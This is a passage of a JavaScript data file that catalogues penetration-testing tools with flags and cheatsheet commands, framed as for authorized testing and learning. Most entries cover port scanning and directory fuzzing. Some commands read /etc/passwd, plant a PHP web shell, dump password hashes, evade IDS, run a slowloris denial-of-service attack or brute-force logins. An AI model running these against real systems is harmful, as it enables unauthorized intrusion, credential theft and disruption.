// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Comprehensive Security Tool Reference Database
// 80+ tools with full command references, flags, examples, and cheatsheets
// For authorized security testing and educational purposes only.

export const TOOL_CATEGORIES = [
  "recon", "web", "exploitation", "password", "wireless",
  "network", "enumeration", "privesc", "post-exploitation",
  "osint", "forensics", "mobile", "cloud", "containers"
];

export const TOOL_REFERENCE = [

  // ============================================================================
  // RECONNAISSANCE TOOLS
  // ============================================================================

  {
    name: "nmap",
    category: "recon",
    description: "Network exploration tool and security/port scanner. The de facto standard for network discovery and security auditing. Supports TCP SYN, connect, UDP, SCTP, and dozens of other scan types with OS detection, version detection, and the Nmap Scripting Engine (NSE).",
    website: "https://nmap.org",
    install: "sudo apt install nmap",
    basic_usage: [
      { cmd: "nmap 192.168.1.1", desc: "Basic scan of a single host (top 1000 TCP ports)" },
      { cmd: "nmap 192.168.1.0/24", desc: "Scan an entire subnet" },
      { cmd: "nmap -sV 192.168.1.1", desc: "Version detection on open ports" },
      { cmd: "nmap -O 192.168.1.1", desc: "OS detection" },
      { cmd: "nmap -p 80,443,8080 192.168.1.1", desc: "Scan specific ports" },
      { cmd: "nmap -p- 192.168.1.1", desc: "Scan all 65535 ports" },
      { cmd: "nmap -sU 192.168.1.1", desc: "UDP scan" },
      { cmd: "nmap -sn 192.168.1.0/24", desc: "Ping sweep (host discovery only)" },
      { cmd: "nmap -A 192.168.1.1", desc: "Aggressive scan (OS, version, scripts, traceroute)" }
    ],
    advanced_usage: [
      { cmd: "nmap -sS -sV -O -p- -T4 --min-rate 1000 TARGET", desc: "Full SYN scan with version and OS detection" },
      { cmd: "nmap --script vuln TARGET", desc: "Run all vulnerability detection scripts" },
      { cmd: "nmap --script=http-enum TARGET", desc: "Enumerate web directories and files" },
      { cmd: "nmap -sV --script=banner TARGET", desc: "Grab service banners" },
      { cmd: "nmap -Pn -sS -p 445 --script smb-vuln* TARGET", desc: "Check for SMB vulnerabilities (EternalBlue, etc.)" },
      { cmd: "nmap --script ssl-enum-ciphers -p 443 TARGET", desc: "Enumerate SSL/TLS cipher suites" },
      { cmd: "nmap -sV -p 21 --script ftp-anon TARGET", desc: "Check for anonymous FTP access" },
      { cmd: "nmap -D RND:10 TARGET", desc: "Decoy scan with 10 random decoy IPs" },
      { cmd: "nmap -f --mtu 24 TARGET", desc: "Fragment packets with custom MTU for IDS evasion" },
      { cmd: "nmap --script dns-brute --script-args dns-brute.domain=TARGET", desc: "DNS subdomain brute force" }
    ],
    common_flags: [
      { flag: "-sS", desc: "TCP SYN scan (stealth scan, default with root)" },
      { flag: "-sT", desc: "TCP connect scan (full 3-way handshake)" },
      { flag: "-sU", desc: "UDP scan" },
      { flag: "-sV", desc: "Service/version detection" },
      { flag: "-sC", desc: "Run default NSE scripts (equivalent to --script=default)" },
      { flag: "-O", desc: "OS detection" },
      { flag: "-A", desc: "Aggressive: -O -sV -sC --traceroute combined" },
      { flag: "-p", desc: "Specify ports (-p 80, -p 1-1000, -p- for all)" },
      { flag: "-T0 to -T5", desc: "Timing template (0=paranoid, 3=normal, 4=aggressive, 5=insane)" },
      { flag: "-Pn", desc: "Skip host discovery (treat all hosts as online)" },
      { flag: "-n", desc: "Never do DNS resolution" },
      { flag: "-oN/-oX/-oG/-oA", desc: "Output: normal/XML/grepable/all formats" },
      { flag: "--min-rate", desc: "Minimum packets per second" },
      { flag: "--max-retries", desc: "Maximum port scan probe retransmissions" },
      { flag: "-iL", desc: "Input from list of hosts/networks" },
      { flag: "--script", desc: "Specify NSE scripts to run" },
      { flag: "-6", desc: "Enable IPv6 scanning" },
      { flag: "-D", desc: "Decoy scan (cloak with bogus IPs)" },
      { flag: "-f", desc: "Fragment packets" },
      { flag: "--reason", desc: "Display reason a port is in a particular state" },
      { flag: "--open", desc: "Only show open ports" }
    ],
    output_format: "Displays port/state/service table. Supports normal (-oN), XML (-oX), grepable (-oG), and all formats (-oA) output files.",
    cheatsheet: [
      "nmap -sC -sV -oA initial TARGET",
      "nmap -p- --min-rate 10000 TARGET",
      "nmap -sU --top-ports 50 TARGET",
      "nmap --script 'vuln and safe' TARGET",
      "nmap -sV --version-intensity 5 TARGET",
      "nmap --script http-title -p 80,443,8080,8443 TARGET",
      "nmap -sn -PE -PP -PM -PS80,443 -PA3389 -PU40125 TARGET/24",
      "nmap --script smb-os-discovery -p 445 TARGET",
      "nmap --script mysql-info -p 3306 TARGET",
      "nmap -sV -p 22 --script ssh-auth-methods TARGET",
      "nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=DOMAIN -p 53 NS",
      "nmap --script http-methods --script-args http-methods.url-path=/api -p 80 TARGET",
      "nmap -Pn --script=http-slowloris --max-parallelism 400 TARGET",
      "nmap --script broadcast-dhcp-discover",
      "nmap -sV --script=vulscan/vulscan.nse TARGET"
    ],
    related_tools: ["masscan", "rustscan", "unicornscan", "zmap"]
  },

  {
    name: "masscan",
    category: "recon",
    description: "The fastest Internet port scanner. Can scan the entire Internet in under 5 minutes, transmitting 10 million packets per second. Uses asynchronous transmission for extreme speed. Produces nmap-compatible output.",
    website: "https://github.com/robertdavidgraham/masscan",
    install: "sudo apt install masscan",
    basic_usage: [
      { cmd: "masscan 192.168.1.0/24 -p80,443", desc: "Scan subnet for web ports" },
      { cmd: "masscan 192.168.1.0/24 -p0-65535 --rate 1000", desc: "All ports at 1000 packets/sec" },
      { cmd: "masscan 10.0.0.0/8 -p22 --rate 10000", desc: "Fast SSH scan of large range" },
      { cmd: "masscan -iL targets.txt -p80,443,8080", desc: "Scan from target list" },
      { cmd: "masscan 192.168.1.0/24 --top-ports 100", desc: "Top 100 ports" }
    ],
    advanced_usage: [
      { cmd: "masscan 0.0.0.0/0 -p80 --rate 100000 --excludefile exclude.txt", desc: "Internet-wide scan with exclusions" },
      { cmd: "masscan TARGET -p80 --banners --source-port 61000", desc: "Grab banners from specific source port" },
      { cmd: "masscan TARGET -p0-65535 --rate 1000 -oJ output.json", desc: "Full port scan with JSON output" },
      { cmd: "masscan TARGET --adapter-ip 192.168.1.100 -p80", desc: "Use specific source IP" },
      { cmd: "masscan TARGET -p80,443 --retries 2 --rate 500", desc: "Scan with retries for reliability" }
    ],
    common_flags: [
      { flag: "-p", desc: "Port(s) to scan (e.g., -p80, -p0-65535)" },
      { flag: "--rate", desc: "Packets per second to transmit" },
      { flag: "--banners", desc: "Capture banners/responses from open ports" },
      { flag: "-oJ/-oX/-oG/-oL", desc: "Output format: JSON/XML/grepable/list" },
      { flag: "--excludefile", desc: "File of IPs/ranges to exclude" },
      { flag: "--top-ports", desc: "Scan N most common ports" },
      { flag: "--retries", desc: "Number of retries for each port probe" },
      { flag: "--source-port", desc: "Use specific source port number" },
      { flag: "-iL", desc: "Input file with list of targets" },
      { flag: "--adapter-ip", desc: "Use specific source IP address" }
    ],
    output_format: "Outputs open port discoveries as they are found. Supports JSON (-oJ), XML (-oX), grepable (-oG), and list (-oL) formats.",
    cheatsheet: [
      "masscan 10.0.0.0/8 -p80,443 --rate 10000 -oJ results.json",
      "masscan TARGET -p0-65535 --rate 1000 | tee all_ports.txt",
      "masscan TARGET --top-ports 1000 --rate 5000",
      "masscan TARGET -p80 --banners --source-port 60000",
      "masscan TARGET/24 -p22,80,443,3306,5432,6379,27017 --rate 2000",
      "masscan 192.168.0.0/16 -p445 --rate 5000 -oG smb_hosts.txt",
      "masscan TARGET -p21 --banners | grep -i 'ftp'",
      "masscan TARGET -p1-10000 --rate 500 --retries 3"
    ],
    related_tools: ["nmap", "rustscan", "zmap"]
  },

  {
    name: "rustscan",
    category: "recon",
    description: "Modern port scanner written in Rust that finds open ports quickly, then automatically pipes results into Nmap for detailed scanning. Combines masscan-like speed with nmap's feature set. Scans all 65535 ports in seconds.",
    website: "https://github.com/RustScan/RustScan",
    install: "cargo install rustscan  # or download from GitHub releases",
    basic_usage: [
      { cmd: "rustscan -a 192.168.1.1", desc: "Scan all ports on a host" },
      { cmd: "rustscan -a 192.168.1.1 -p 80,443", desc: "Scan specific ports" },
      { cmd: "rustscan -a 192.168.1.1 -- -sV", desc: "Pipe to nmap with version detection" },
      { cmd: "rustscan -a 192.168.1.1 -- -A", desc: "Pipe to nmap aggressive scan" },
      { cmd: "rustscan -a 192.168.1.1 -b 1000", desc: "Batch size of 1000 (rate control)" }
    ],
    advanced_usage: [
      { cmd: "rustscan -a TARGET -- -sC -sV -oN output.txt", desc: "Full scan piped to nmap with scripts and version" },
      { cmd: "rustscan -a TARGET -r 1-65535 --ulimit 5000", desc: "Full range with high ulimit" },
      { cmd: "rustscan -a TARGET -- --script vuln", desc: "Quick port find then vulnerability scan" },
      { cmd: "rustscan -a TARGET -b 500 --timeout 3000", desc: "Custom batch size and timeout" },
      { cmd: "rustscan -g -a TARGET", desc: "Greppable output for scripting" }
    ],
    common_flags: [
      { flag: "-a", desc: "Target address(es) to scan" },
      { flag: "-p", desc: "Specific port(s) to scan" },
      { flag: "-r", desc: "Port range (e.g., 1-65535)" },
      { flag: "-b", desc: "Batch size (number of ports scanned concurrently)" },
      { flag: "--ulimit", desc: "File descriptor ulimit for scanning speed" },
      { flag: "--timeout", desc: "Timeout in milliseconds" },
      { flag: "-g", desc: "Greppable output" },
      { flag: "--", desc: "Everything after -- is passed to nmap" },
      { flag: "--accessible", desc: "Accessible mode (screen reader friendly)" }
    ],
    output_format: "Lists open ports quickly, then runs nmap on discovered ports with full output.",
    cheatsheet: [
      "rustscan -a TARGET -- -sC -sV -oA full_scan",
      "rustscan -a TARGET -b 2000 --ulimit 5000",
      "rustscan -a TARGET -- --script vuln -oN vulns.txt",
      "rustscan -a TARGET -p 80,443 -- -A",
      "rustscan -a TARGET -r 1-10000 -- -sV",
      "rustscan -a 10.10.10.1,10.10.10.2,10.10.10.3 -- -sC"
    ],
    related_tools: ["nmap", "masscan", "zmap"]
  },

  {
    name: "unicornscan",
    category: "recon",
    description: "Asynchronous stateless TCP and UDP port scanner. Uses a unique approach where the sender and receiver are separate processes, enabling very fast scanning. Supports stimulus-response based protocol analysis.",
    website: "https://github.com/dneufeld/unicornscan",
    install: "sudo apt install unicornscan",
    basic_usage: [
      { cmd: "unicornscan 192.168.1.1", desc: "Default TCP SYN scan" },
      { cmd: "unicornscan -mT 192.168.1.1:a", desc: "TCP SYN scan all ports" },
      { cmd: "unicornscan -mU 192.168.1.1", desc: "UDP scan" },
      { cmd: "unicornscan -r 300 192.168.1.1", desc: "Scan at 300 packets/sec" },
      { cmd: "unicornscan 192.168.1.0/24:80", desc: "Scan port 80 across subnet" }
    ],
    advanced_usage: [
      { cmd: "unicornscan -mT -r 10000 -I TARGET:a", desc: "Fast full TCP scan with immediate reporting" },
      { cmd: "unicornscan -mU -r 5000 TARGET:1-1024", desc: "UDP scan of privileged ports" },
      { cmd: "unicornscan -mTsf -r 1000 TARGET:a", desc: "TCP SYN scan with fingerprinting" },
      { cmd: "unicornscan -msf TARGET:80,443,8080", desc: "Scan web ports with service fingerprint" }
    ],
    common_flags: [
      { flag: "-mT", desc: "TCP scan mode (SYN)" },
      { flag: "-mU", desc: "UDP scan mode" },
      { flag: "-r", desc: "Packets per second rate" },
      { flag: "-I", desc: "Immediately display results" },
      { flag: "-i", desc: "Interface to use" },
      { flag: "-l", desc: "Log to file" },
      { flag: ":a", desc: "Scan all ports (appended to target)" },
      { flag: "-s", desc: "Source port" },
      { flag: "-f", desc: "Enable fingerprinting" }
    ],
    output_format: "Real-time port discovery output with protocol and state information.",
    cheatsheet: [
      "unicornscan -mT -r 5000 TARGET:a",
      "unicornscan -mU -r 3000 TARGET:1-1024",
      "unicornscan -mT TARGET:80,443,8080,8443",
      "unicornscan -mTsf TARGET:a -l scan.log"
    ],
    related_tools: ["nmap", "masscan", "zmap"]
  },

  {
    name: "zmap",
    category: "recon",
    description: "Fast single-packet network scanner designed for Internet-wide surveys. Can scan the entire IPv4 address space on a single port in under 45 minutes on a gigabit connection. Sends one probe packet per host without maintaining per-connection state.",
    website: "https://zmap.io",
    install: "sudo apt install zmap",
    basic_usage: [
      { cmd: "zmap -p 80 192.168.1.0/24", desc: "Scan port 80 on a subnet" },
      { cmd: "zmap -p 443 -o results.txt 10.0.0.0/8", desc: "Scan port 443, save results" },
      { cmd: "zmap -p 22 -B 10M 192.168.0.0/16", desc: "SSH scan at 10Mbps bandwidth" },
      { cmd: "zmap -p 80 -n 1000000", desc: "Scan 1M random hosts on port 80" }
    ],
    advanced_usage: [
      { cmd: "zmap -p 80 0.0.0.0/0 -b blacklist.txt -B 100M -o results.csv", desc: "Internet-wide scan with blacklist at 100Mbps" },
      { cmd: "zmap -p 443 -o - | zgrab2 tls -o tls_results.json", desc: "Pipe to zgrab2 for TLS handshake data" },
      { cmd: "zmap --probe-module=udp -p 53 --probe-args=file:dns_query.pkt TARGET/24", desc: "Custom UDP probe for DNS" },
      { cmd: "zmap -M icmp_echoscan 10.0.0.0/8 -o alive_hosts.txt", desc: "ICMP ping sweep" }
    ],
    common_flags: [
      { flag: "-p", desc: "Target port number" },
      { flag: "-o", desc: "Output file (- for stdout)" },
      { flag: "-B", desc: "Bandwidth limit (e.g., 10M, 1G)" },
      { flag: "-n", desc: "Number of targets to scan" },
      { flag: "-b", desc: "Blacklist file of IPs to skip" },
      { flag: "-w", desc: "Whitelist file of IPs to scan" },
      { flag: "-r", desc: "Send rate in packets/sec" },
      { flag: "-M", desc: "Probe module (tcp_synscan, icmp_echoscan, udp)" },
      { flag: "-i", desc: "Network interface" },
      { flag: "--seed", desc: "Seed for address permutation" }
    ],
    output_format: "One responsive IP per line. Supports CSV output with additional fields via output modules.",
    cheatsheet: [
      "zmap -p 80 192.168.0.0/16 -o web_hosts.txt",
      "zmap -p 443 -B 10M TARGET/24 | zgrab2 http -o http.json",
      "zmap -p 22 -n 100000 -o ssh_hosts.txt",
      "zmap -M icmp_echoscan 10.0.0.0/8 -B 5M -o alive.txt",
      "zmap -p 3389 TARGET/16 -o rdp_hosts.txt"
    ],
    related_tools: ["nmap", "masscan", "zgrab2"]
  },

  // ============================================================================
  // WEB APPLICATION TESTING TOOLS
  // ============================================================================

  {
    name: "nikto",
    category: "web",
    description: "Open source web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, outdated server versions, and version-specific problems. Checks for server configuration items such as multiple index files and HTTP methods.",
    website: "https://cirt.net/Nikto2",
    install: "sudo apt install nikto",
    basic_usage: [
      { cmd: "nikto -h http://TARGET", desc: "Basic web server scan" },
      { cmd: "nikto -h TARGET -p 8080", desc: "Scan on a specific port" },
      { cmd: "nikto -h TARGET -ssl", desc: "Force SSL connection" },
      { cmd: "nikto -h TARGET -o report.html -Format htm", desc: "HTML report output" },
      { cmd: "nikto -h TARGET -Tuning 9", desc: "SQL injection focused scan" }
    ],
    advanced_usage: [
      { cmd: "nikto -h TARGET -Tuning x 6 -o report.xml", desc: "Reverse tuning: all except DoS tests" },
      { cmd: "nikto -h TARGET -Plugins apacheusers", desc: "Run specific plugin" },
      { cmd: "nikto -h TARGET -evasion 1", desc: "IDS evasion: random URI encoding" },
      { cmd: "nikto -h TARGET -mutate 1 -mutate 2", desc: "Guess directories and filenames" },
      { cmd: "nikto -h TARGET -useproxy http://127.0.0.1:8080", desc: "Route through Burp proxy" },
      { cmd: "nikto -h TARGET -C all", desc: "Force check all CGI directories" },
      { cmd: "nikto -h TARGET -maxtime 30m", desc: "Set maximum scan time" }
    ],
    common_flags: [
      { flag: "-h", desc: "Target host (IP, hostname, or URL)" },
      { flag: "-p", desc: "Port(s) to scan (can be comma-separated)" },
      { flag: "-ssl", desc: "Force SSL mode" },
      { flag: "-o", desc: "Output file" },
      { flag: "-Format", desc: "Output format: csv, htm, xml, txt, json" },
      { flag: "-Tuning", desc: "Scan tuning: 1=files, 2=misconfig, 3=info, 4=injection, 5=remote, 6=dos, 7=remote, 8=command exec, 9=SQL injection, 0=file upload" },
      { flag: "-evasion", desc: "IDS evasion technique (1-8)" },
      { flag: "-Plugins", desc: "Select which plugins to run" },
      { flag: "-mutate", desc: "Guess additional content (1=dirs, 2=files, 3=users, 4=file permissions, 5=subdomain, 6=dir names)" },
      { flag: "-useproxy", desc: "Use HTTP proxy" },
      { flag: "-C", desc: "CGI directory scanning ('all' for all, 'none' to skip)" },
      { flag: "-maxtime", desc: "Maximum scan time" },
      { flag: "-id", desc: "HTTP authentication (user:pass)" },
      { flag: "-update", desc: "Update databases and plugins" }
    ],
    output_format: "Verbose findings with OSVDB references. Supports HTML, XML, CSV, JSON, and text output.",
    cheatsheet: [
      "nikto -h TARGET -o report.html -Format htm",
      "nikto -h TARGET -ssl -p 443",
      "nikto -h TARGET -C all -Plugins outdated",
      "nikto -h TARGET -Tuning 1234 -maxtime 1h",
      "nikto -h TARGET -evasion 1 -useproxy http://127.0.0.1:8080",
      "nikto -h TARGET -mutate 1 -mutate 2 -o dirs.txt",
      "nikto -h TARGET -id admin:admin",
      "nikto -h https://TARGET -no404",
      "nikto -h TARGET -vhost otherdomain.com"
    ],
    related_tools: ["nuclei", "whatweb", "wappalyzer"]
  },

  {
    name: "sqlmap",
    category: "web",
    description: "Automatic SQL injection and database takeover tool. Supports full detection and exploitation of SQL injection flaws, with support for MySQL, Oracle, PostgreSQL, MSSQL, SQLite, and many more. Can enumerate databases, tables, columns, dump data, access the filesystem, and execute commands on the OS via out-of-band connections.",
    website: "https://sqlmap.org",
    install: "sudo apt install sqlmap",
    basic_usage: [
      { cmd: "sqlmap -u 'http://TARGET/page?id=1'", desc: "Test URL parameter for SQLi" },
      { cmd: "sqlmap -u URL --dbs", desc: "Enumerate databases" },
      { cmd: "sqlmap -u URL -D dbname --tables", desc: "List tables in a database" },
      { cmd: "sqlmap -u URL -D dbname -T users --dump", desc: "Dump a table" },
      { cmd: "sqlmap -u URL --forms", desc: "Auto-detect and test forms" },
      { cmd: "sqlmap -r request.txt", desc: "Test from saved HTTP request file" }
    ],
    advanced_usage: [
      { cmd: "sqlmap -u URL --os-shell", desc: "Get an interactive OS shell" },
      { cmd: "sqlmap -u URL --os-pwn", desc: "OOB Meterpreter/VNC shell" },
      { cmd: "sqlmap -u URL --file-read='/etc/passwd'", desc: "Read a file from the server" },
      { cmd: "sqlmap -u URL --file-write=shell.php --file-dest=/var/www/shell.php", desc: "Write file to server" },
      { cmd: "sqlmap -u URL --technique=BEUST --level=5 --risk=3", desc: "All techniques, max detection" },
      { cmd: "sqlmap -u URL --tamper=space2comment,charencode", desc: "WAF bypass with tamper scripts" },
      { cmd: "sqlmap -u URL --batch --crawl=3", desc: "Crawl site and test all found URLs" },
      { cmd: "sqlmap -u URL -p id --dbms=mysql --sql-shell", desc: "Interactive SQL shell on MySQL" },
      { cmd: "sqlmap -u URL --reg-read --reg-key='HKLM\\...' --reg-value=key", desc: "Read Windows registry" },
      { cmd: "sqlmap -u URL --passwords --threads=10", desc: "Dump and crack password hashes" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL with injectable parameter" },
      { flag: "-r", desc: "Load HTTP request from file" },
      { flag: "-p", desc: "Testable parameter(s)" },
      { flag: "--data", desc: "POST data string" },
      { flag: "--cookie", desc: "HTTP Cookie header value" },
      { flag: "--dbs", desc: "Enumerate databases" },
      { flag: "--tables", desc: "Enumerate tables" },
      { flag: "--columns", desc: "Enumerate columns" },
      { flag: "--dump", desc: "Dump table entries" },
      { flag: "--dump-all", desc: "Dump all databases tables entries" },
      { flag: "-D/-T/-C", desc: "Specify database/table/column" },
      { flag: "--level", desc: "Level of tests to perform (1-5)" },
      { flag: "--risk", desc: "Risk of tests to perform (1-3)" },
      { flag: "--technique", desc: "SQL injection techniques (B=boolean, E=error, U=union, S=stacked, T=time, Q=inline)" },
      { flag: "--tamper", desc: "WAF/IPS evasion scripts" },
      { flag: "--os-shell", desc: "Prompt for interactive OS shell" },
      { flag: "--batch", desc: "Never ask for user input, use defaults" },
      { flag: "--threads", desc: "Number of concurrent threads" },
      { flag: "--proxy", desc: "Use proxy (e.g., http://127.0.0.1:8080)" },
      { flag: "--dbms", desc: "Force specific DBMS" },
      { flag: "--random-agent", desc: "Use random HTTP User-Agent" },
      { flag: "--crawl", desc: "Crawl depth from starting URL" }
    ],
    output_format: "Interactive terminal output with findings, stored in ~/.local/share/sqlmap/output/. Supports CSV dump files.",
    cheatsheet: [
      "sqlmap -u 'URL?id=1' --batch --dbs",
      "sqlmap -u URL -D db -T users --dump --threads=5",
      "sqlmap -r req.txt -p param --level=5 --risk=3",
      "sqlmap -u URL --os-shell --batch",
      "sqlmap -u URL --tamper=space2comment --random-agent",
      "sqlmap -u URL --forms --batch --crawl=2",
      "sqlmap -u URL --passwords --batch",
      "sqlmap -u URL --file-read=/etc/passwd",
      "sqlmap -u URL --sql-shell",
      "sqlmap -u URL --technique=T --time-sec=5",
      "sqlmap -u URL --proxy=http://127.0.0.1:8080 --batch",
      "sqlmap -u URL --is-dba --current-user --current-db"
    ],
    related_tools: ["burpsuite", "wfuzz", "nuclei"]
  },

  {
    name: "ffuf",
    category: "web",
    description: "Fast web fuzzer written in Go. Used for directory/file discovery, virtual host discovery, parameter fuzzing, and POST data fuzzing. Extremely fast with support for matchers and filters based on status codes, response size, word count, line count, and regex.",
    website: "https://github.com/ffuf/ffuf",
    install: "go install github.com/ffuf/ffuf/v2@latest  # or apt install ffuf",
    basic_usage: [
      { cmd: "ffuf -u http://TARGET/FUZZ -w wordlist.txt", desc: "Directory brute force" },
      { cmd: "ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.html,.txt", desc: "With file extensions" },
      { cmd: "ffuf -u http://TARGET/ -H 'Host: FUZZ.target.com' -w subdomains.txt", desc: "Virtual host discovery" },
      { cmd: "ffuf -u http://TARGET/?FUZZ=test -w params.txt", desc: "Parameter discovery" },
      { cmd: "ffuf -u http://TARGET/api/FUZZ -w wordlist.txt -mc 200", desc: "Filter to 200 OK responses only" }
    ],
    advanced_usage: [
      { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -fc 404,403 -fs 0 -t 100", desc: "High speed with status and size filters" },
      { cmd: "ffuf -u URL -X POST -d 'user=FUZZ&pass=FUZZ2' -w users.txt:FUZZ -w passes.txt:FUZZ2", desc: "Multi-wordlist POST fuzzing" },
      { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -recursion -recursion-depth 3", desc: "Recursive directory discovery" },
      { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -o results.json -of json", desc: "JSON output for automation" },
      { cmd: "ffuf -u URL -H 'Authorization: Bearer FUZZ' -w tokens.txt -mc 200", desc: "Fuzz auth tokens" },
      { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080", desc: "Send matches to Burp" },
      { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -rate 100 -p 0.1", desc: "Rate limiting with delay" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL (FUZZ keyword marks injection point)" },
      { flag: "-w", desc: "Wordlist file path (can assign to keyword: -w list.txt:KEYWORD)" },
      { flag: "-e", desc: "Comma-separated list of extensions to append" },
      { flag: "-H", desc: "HTTP header (can use FUZZ in header value)" },
      { flag: "-X", desc: "HTTP method (GET, POST, PUT, etc.)" },
      { flag: "-d", desc: "POST data" },
      { flag: "-mc", desc: "Match HTTP status codes (e.g., 200,301)" },
      { flag: "-fc", desc: "Filter HTTP status codes (e.g., 404)" },
      { flag: "-ms", desc: "Match response size" },
      { flag: "-fs", desc: "Filter response size" },
      { flag: "-mw/-fw", desc: "Match/filter word count" },
      { flag: "-ml/-fl", desc: "Match/filter line count" },
      { flag: "-mr/-fr", desc: "Match/filter regex" },
      { flag: "-t", desc: "Number of concurrent threads (default 40)" },
      { flag: "-rate", desc: "Rate of requests per second" },
      { flag: "-p", desc: "Delay between requests (seconds)" },
      { flag: "-recursion", desc: "Enable recursive scanning" },
      { flag: "-recursion-depth", desc: "Maximum recursion depth" },
      { flag: "-o", desc: "Output file" },
      { flag: "-of", desc: "Output format: json, ejson, html, md, csv, all" },
      { flag: "-replay-proxy", desc: "Send matched requests to proxy" },
      { flag: "-ac", desc: "Automatically calibrate filtering" },
      { flag: "-ic", desc: "Ignore wordlist comments" },
      { flag: "-b", desc: "Cookie data" }
    ],
    output_format: "Real-time status table with progress bar. Supports JSON, CSV, HTML, Markdown output files.",
    cheatsheet: [
      "ffuf -u URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
      "ffuf -u URL/FUZZ -w wordlist.txt -e .php,.bak,.old -mc 200,301,302",
      "ffuf -u URL/ -H 'Host: FUZZ.domain.com' -w subdomains.txt -fs 0",
      "ffuf -u URL/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -ac",
      "ffuf -u URL/api/v1/FUZZ -w wordlist.txt -mc 200 -o api_endpoints.json -of json",
      "ffuf -u URL -X POST -d '{\"user\":\"FUZZ\"}' -H 'Content-Type: application/json' -w users.txt",
      "ffuf -u URL/FUZZ -w wordlist.txt -fc 404 -t 100 -rate 500",
      "ffuf -u URL/?FUZZ=value -w params.txt -fs 4242",
      "ffuf -u URL/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080",
      "ffuf -u URL/FUZZ -w big.txt -ic -ac -v"
    ],
    related_tools: ["gobuster", "feroxbuster", "wfuzz", "dirb"]
  },

  {
    name: "gobuster",
    category: "web",
    description: "Directory/file, DNS, and virtual host busting tool written in Go. Supports multiple modes: dir (directory/file enumeration), dns (DNS subdomain enumeration), vhost (virtual host enumeration), fuzz (fuzzing), s3 (S3 bucket enumeration), and gcs (Google Cloud Storage).",
    website: "https://github.com/OJ/gobuster",
    install: "sudo apt install gobuster  # or go install github.com/OJ/gobuster/v3@latest",
    basic_usage: [
      { cmd: "gobuster dir -u http://TARGET -w wordlist.txt", desc: "Directory brute force" },
      { cmd: "gobuster dir -u URL -w wordlist.txt -x php,html,txt", desc: "With file extensions" },
      { cmd: "gobuster dns -d target.com -w subdomains.txt", desc: "DNS subdomain enumeration" },
      { cmd: "gobuster vhost -u http://TARGET -w vhosts.txt", desc: "Virtual host discovery" },
      { cmd: "gobuster s3 -w buckets.txt", desc: "S3 bucket enumeration" }
    ],
    advanced_usage: [
      { cmd: "gobuster dir -u URL -w wordlist.txt -t 50 -o results.txt --no-error", desc: "Fast scan, save results" },
      { cmd: "gobuster dir -u URL -w wordlist.txt -s 200,204,301,302,307,401,403 -b ''", desc: "Custom status codes" },
      { cmd: "gobuster dir -u URL -w wordlist.txt -c 'session=abc123' -H 'Authorization: Bearer token'", desc: "With cookies and headers" },
      { cmd: "gobuster dir -u URL -w wordlist.txt -x php -d -r", desc: "Discover with follow redirects" },
      { cmd: "gobuster fuzz -u URL/FUZZ -w wordlist.txt --exclude-length 0", desc: "Fuzz mode with length filter" }
    ],
    common_flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-w", desc: "Wordlist file path" },
      { flag: "-x", desc: "File extensions to append (dir mode)" },
      { flag: "-t", desc: "Number of concurrent threads (default 10)" },
      { flag: "-o", desc: "Output file" },
      { flag: "-s", desc: "Positive status codes (dir mode)" },
      { flag: "-b", desc: "Negative status codes (dir mode)" },
      { flag: "-c", desc: "Cookie string" },
      { flag: "-H", desc: "HTTP header" },
      { flag: "-r", desc: "Follow redirects" },
      { flag: "-k", desc: "Skip TLS certificate verification" },
      { flag: "-a", desc: "User-Agent string" },
      { flag: "-p", desc: "Proxy URL" },
      { flag: "-d", desc: "DNS domain (dns mode)" },
      { flag: "--no-error", desc: "Don't display errors" },
      { flag: "--delay", desc: "Delay between requests" },
      { flag: "-n", desc: "Don't print status codes" },
      { flag: "-e", desc: "Print full URLs in results" },
      { flag: "--wildcard", desc: "Force processing of wildcard responses" }
    ],
    output_format: "Real-time discovery output with status codes and sizes. Plain text file output.",
    cheatsheet: [
      "gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt -t 30",
      "gobuster dir -u URL -w big.txt -x php,html -o dirs.txt",
      "gobuster dns -d domain.com -w subdomains.txt -t 50",
      "gobuster vhost -u http://TARGET -w vhosts.txt --append-domain",
      "gobuster dir -u URL -w wordlist.txt -k -r --no-error",
      "gobuster dir -u URL -w wordlist.txt -c 'PHPSESSID=abc' -t 20",
      "gobuster s3 -w bucket-names.txt",
      "gobuster fuzz -u URL/FUZZ -w wordlist.txt -b 404"
    ],
    related_tools: ["ffuf", "feroxbuster", "dirb", "wfuzz"]
  },

  {
    name: "wfuzz",
    category: "web",
    description: "Web application fuzzer. Replaces any reference of the FUZZ keyword in the request with a payload from a wordlist. Supports multiple injection points, encoders, iterator algorithms, and a powerful filtering engine based on return code, word count, line count, and regex.",
    website: "https://github.com/xmendez/wfuzz",
    install: "pip install wfuzz  # or sudo apt install wfuzz",
    basic_usage: [
      { cmd: "wfuzz -c -w wordlist.txt http://TARGET/FUZZ", desc: "Directory brute force with colors" },
      { cmd: "wfuzz -c -w wordlist.txt --hc 404 http://TARGET/FUZZ", desc: "Hide 404 responses" },
      { cmd: "wfuzz -c -w wordlist.txt -H 'Host: FUZZ.target.com' http://TARGET", desc: "Virtual host fuzzing" },
      { cmd: "wfuzz -c -z range,1-100 http://TARGET/page?id=FUZZ", desc: "Range-based parameter fuzzing" },
      { cmd: "wfuzz -c -w wordlist.txt --hw 50 http://TARGET/FUZZ", desc: "Hide responses with 50 words" }
    ],
    advanced_usage: [
      { cmd: "wfuzz -c -w users.txt -w passes.txt --basic FUZZ:FUZ2Z http://TARGET/admin", desc: "Brute force HTTP Basic auth" },
      { cmd: "wfuzz -c -w wordlist.txt -d 'user=FUZZ&pass=test' http://TARGET/login", desc: "POST parameter fuzzing" },
